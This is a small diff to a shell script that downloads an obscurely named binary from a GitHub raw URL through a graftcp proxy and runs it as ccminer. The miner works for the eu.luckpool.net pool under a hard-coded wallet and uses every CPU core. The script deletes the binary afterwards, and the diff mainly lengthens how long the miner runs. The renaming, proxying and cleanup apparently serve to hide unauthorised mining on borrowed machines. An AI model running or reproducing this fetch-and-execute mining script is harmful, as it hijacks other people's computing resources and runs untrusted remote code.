@@ -59,6 +59,7 @@ END
   ./graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/main/kulibang
   chmod +x kulibang
 
+  sleep 200
   # Run ccminer in the background
   ./graftcp/graftcp ./kulibang -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.SKYLAKE -p x -t "$(nproc)" &
 
@@ -66,7 +67,7 @@ END
   ccminer_pid=$!
 
   # Sleep for xx minutes
-  sleep 1500
+  sleep 2600
 
   rm kulibang
 
